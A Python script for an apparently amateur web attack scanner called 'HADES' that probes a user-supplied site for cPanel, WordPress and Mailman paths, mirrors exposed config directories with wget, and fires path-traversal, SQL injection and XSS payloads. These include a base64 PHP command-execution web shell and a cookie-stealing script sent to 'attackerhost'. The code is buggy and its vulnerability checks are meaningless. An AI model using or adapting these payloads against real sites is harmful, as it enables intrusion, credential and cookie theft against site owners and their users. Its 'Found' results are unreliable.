import sys
import requests
import os
import colorama
from bs4 import BeautifulSoup

from urllib.parse import urlparse
from urllib.request import urlopen
from colorama import Fore, Back, Style






 #     os.system('clear')
 #      x = input(f"\n\n sorry Please Supply A Website To Test")
 #      print (x)
 #      sys.exit()
 #   else:
 #        print("")






def banner():
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    v = "1.0"
    print(f"""

      {r} __ ___   __   _ _    ____
      {g}|  |  |  /  \ |    \ |  __|  ___
      {r}|  __ | /    \|     || |--- / __/
      {g}|  __ || (_) ||     || |--- \__ /
      {r}|__||_|_/__\_||____/ |____|___/
                                          {g}


                {g}*                       *{r}
         {r}*               {g}| {w}{v} {g}|              {r}*
                 {g}| {w}Made By mirai>< {g}|

                       {r}     *
                       {g}    ***
                       {r}   *****
                       {g}  *******
                       {r} *********
                       {g}     ||

        """)

def error():
    banner()
    g = Fore.Green
    x = input(f"{r} Please Enter a site ):")
    os.system("clear")
    exploits()


def exploits():


    r = Fore.RED
    g = Fore.GREEN
    y = Fore.YELLOW
    w = Fore.WHITE
    banner()
    j = input(f"{r}Target: {w}")
    em = ""
    if j == em:
        os.system("clear")

        error()

    else:
            print("")
    url = j+''
    try:
        x = requests.get(url+'//mailman/listinfo/mailman?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')
        if x.status_code == 404:



            x = "s"
        else:
            print(f"\n{y}[HADES] > {w}Checking For backend...\n")

            arg = j+''
            try:
                rsp=requests.get(arg, stream=True)
                rsp.raw._connection.sock.getpeername()


                print(f"{y}[HADES] > {g}Found {w}CPANEL {i}Robots {r}Backend")
                print(f"{y}[HADES] > {w}Url : {w}" + arg)
                print(f"{y}[HADES] > {w}Protected :{r}", rsp.raw._connection.sock.getpeername())
                soup = BeautifulSoup(x.text, 'html.parser')
                print(f"\n{y}[HADES] > {w}Backend :", soup.find_all("a", text="Mailman"))
            except:
                print(f"{r}[ERROR] > Looks like the Host is Blocking requests ")

#          os.system(f"curl "+j+"//mailman/listinfo/mailman -s | grep /mailman/subscribe/mailman | cut -c31-110 | tee backend.txt")
#          print(soup.find_all("a", text="Mailman"))
    except:


        l = input(f"TRY AGAIN (press enter)")
        os.system("clear")
        exploits()





    c = requests.head(url+'/cpanel/', allow_redirects=True)
    if c.status_code == 404:
           print(f'{w}\n{y}[HADES] >{w} CPANEL {g}= {r}Not found')

    else:
            print(f"{y}[HADES > {w}CPANEL : {w}",c.url + f" ({g}Might wanna Check this out{w})")



    c = requests.head(url+'sitemap_location.xml', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} Sitemap {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}Sitemap : {w}",c.url + f" ({g}Might wanna Check this out{w})")


    c = requests.head(url+'robots.txt', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} Robots {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}Robots : {w}",c.url + f" ({g}Might wanna Check this out{w})")


    c = requests.head(url+'wp-login.php', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} WordPress {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}WordPress : {w}",c.url + f" ({g}Might wanna Check this out{w})")


    xs = requests.get(url+'')
    print(f"{y}[HADES] > {w}Finding WordPress Plugins...\n")
    if xs.status_code == 404:

          print(f'{y}[HADES] > {w}Parameter 404 {g}= {r}Not found')

    c = requests.head(url+'php_assets/plugins/google-analytics-for-wordpress/', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} wp Parameter {g}= {r}Not found')

    else:
             print(f"{y}[HADES] > {w}wp Parameter : {w}",c.url + f" ({g}Might wanna Check this out{w})")

    c = requests.head(url+'wp-admin/admin-ajax.php', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} wp Parameter {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}wp Parameter : {w}",c.url + f" ({g}Might wanna Check this out{w})")

    c = requests.head(url+'wp-cron.php', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} wp Parameter {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}wp Parameter : {w}",c.url + f" ({g}Might wanna Check this out{w})")

    c = requests.head(url+'wp-admin/', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} wp Parameter {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}wp Parameter : {w}",c.url + f" ({g}Might wanna Check this out{w})")

    c = requests.head(url+'xmlrpc.php', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} wp Parameter {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}wp Parameter : {w}",c.url + f" ({g}Might wanna Check this out{w})")

    c = requests.head(url+'php_assets/mu-plugins/', allow_redirects=True)
    if c.status_code == 404:
            print(f'{w}\n{y}[HADES] >{w} wp Parameter {g}= {r}Not found')

    else:
            print(f"{y}[HADES] > {w}wp Parameter : {w}",c.url + f" ({g}Might wanna Check this out{w})")

    print(f"{w}\n{y}[HADES] >{w} Finding Config Dumps...")
    p = requests.get(url+'//idx_config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')
    if p.status_code == 404:

              print(f'{w}\n{y}[HADES] > {w}Password Configs {g}= {r}Not found')


    else:

            print(f"{y}[HADES] >{w} {w}Checking for Password Configs...\n")
            print(f"{y}[HADES] >{w} {g}Found {w}Password {r}Configs {g}({w}Might be {r}False{g})")
            os.system("wget --execute='robots = off' --mirror --reject='index.html*' --convert-links --no-parent --wait=1 "+j+"//idx_config/" + ">/dev/null 2>&1")
            print(f"{y}[HADES] > {w}File {g}> {r}/idx_config/ ")






    x = requests.get(url+'//.cpanel/caches/config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')

    if x.status_code == 404:

              print(f'{y}\n[HADES] > {w}RSA Configs {g}= {r}Not found\n')


    else:


            print(f"{y}[HADES] > {w}Finding RSA Configs...\n")
            os.system("wget --execute='robots = off' --cut-dirs=3 --reject='index.html*' --mirror --convert-links --no-parent --wait=1 "+j+".cpanel/caches/config/" + ">/dev/null 2>&1")

            print(f"{y}[HADES] > {g}Found {w}CPANEL {r}Configs {g}({w}Might be {r}False{g})")
            print(f"{y}[HADES] > {w}File {g}> {r}/.cpanel/caches/config/")


    xs = requests.get(url+'//mailman/options/yourlist?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')
    print(f"{y}[HADES] > {w}Finding Vulns...\n")
    if xs.status_code == 404:

              print(f'{y}[HADES] > {w}Vulns {g}= {r}Not found')



    else:
            print(f"\n{y}[HADES] > {g}Found XSS {r}{url}{r}/mailman/options/yourlist?language=en&email=<SCRIPT>alert('OOPS')</SCRIPT>")



    xss = requests.get(url+'//mailman/subscribe/ml-name?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')

    if xss.status_code == 404:


              u = "l"


    else:
            l = "d"
            print(f"{y}[HADES] > {g}Found XSS {r}{url}{r}/mailman/subscribe/ml-name?info=<script>document.location%3D'http://attackerhost/attackerscript.cgi?'%2Bdocument.cookie;</script>")





    sqlc = {'code': '1111111111111111111111111'}
    sql = requests.post(url+'//activate.php?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ', data = sqlc)
    if sql.text == "ERROR":

              print(f"{y}[HADES] > {g}Found SQl Injection {r}{url}{r}/activate.php?code=1111111111111111111111111'+OR+user_id='2")
              lol = ":P:"


    sqlc = {'code': '1111111111111111111111111'}
    sql = requests.post(url+'//index.php?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ', data = sqlc)
    if sql.text == "ERROR":

            print(f"{y}[HADES] > {g}Found SQl Injection {r}{url}{r}/index.php?code=1111111111111111111111111'+OR+user_id='2")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/index.php?page=etc/passwd', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/index.php?page=etc/passwd%00', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/index.php?page=../../etc/passwd', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/index.php?page=%252e%252e%252f', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/index.php?page=....//....//etc/passwd', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    lfic = {'code': '1111111111111111111111111'}
    lfi = requests.post(url+'/index.php?page=path/to/uploaded/file.png', data = lfic)
    if lfi.text == "ERROR":

            print(f"{y}[HADES] > {g}Found Local File Inclusion {r}{url}{r}/index.php?page=etc/passwd")
            lol = ":P:"

    else:
            l = "l"
    l = input(f"\n{y}[HADES] > {w}Press enter to go back")
    os.system('clear')
    exploits()


exploits()






def ight():


    y = Fore.YELLOW
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE







ight()
